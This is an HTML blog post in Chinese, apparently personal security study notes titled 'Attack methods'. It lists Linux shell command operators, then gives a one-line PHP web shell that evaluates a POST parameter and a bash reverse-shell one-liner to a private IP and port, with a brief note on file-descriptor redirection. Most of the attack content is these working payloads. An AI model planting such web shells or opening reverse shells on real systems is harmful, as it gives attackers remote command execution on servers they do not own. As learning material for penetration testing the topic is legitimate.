@@ -1,0 +1,67 @@
+<div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="https://th.bing.com/th/id/R.917ca069a2af6fd72956834eb08358c5?rik=BqcoPnxAZUEIMQ&pid=ImgRaw&r=0" alt="攻击方式" loading="lazy">
+            <h1>攻击方式</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2023年09月04日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h1><h2 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a>Linux基础</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;	都执行</span><br><span class="line">;	都执行</span><br><span class="line">&amp;&amp;	与前面成功才会执行后面</span><br><span class="line">|	管道，前面输出作为后面输入</span><br><span class="line">||	或，前面成功，后面不执行</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="php攻击"><a href="#php攻击" class="headerlink" title="php攻击"></a>php攻击</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>小马</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.25.144/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p> <code>&gt;&amp;</code>是对文件描述符的<strong>拷贝</strong>，是将0[标准输入]重定向到了1[标准输出]指向的位置，以写方式</p>
+<p><code>&lt;&amp;</code>以读方式</p>
+<p><code>&gt;&amp;</code>还会将标准错误输出合并到标准输出中</p>
+
+    
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>Author：</strong>Wray Lee<br>
+        <strong>Link：</strong><a href="http://blog.wray7.top/2023/09/04/Network/Safety/%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/" title="http:&#x2F;&#x2F;blog.wray7.top&#x2F;2023&#x2F;09&#x2F;04&#x2F;Network&#x2F;Safety&#x2F;%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;blog.wray7.top&#x2F;2023&#x2F;09&#x2F;04&#x2F;Network&#x2F;Safety&#x2F;%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1712678080609"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
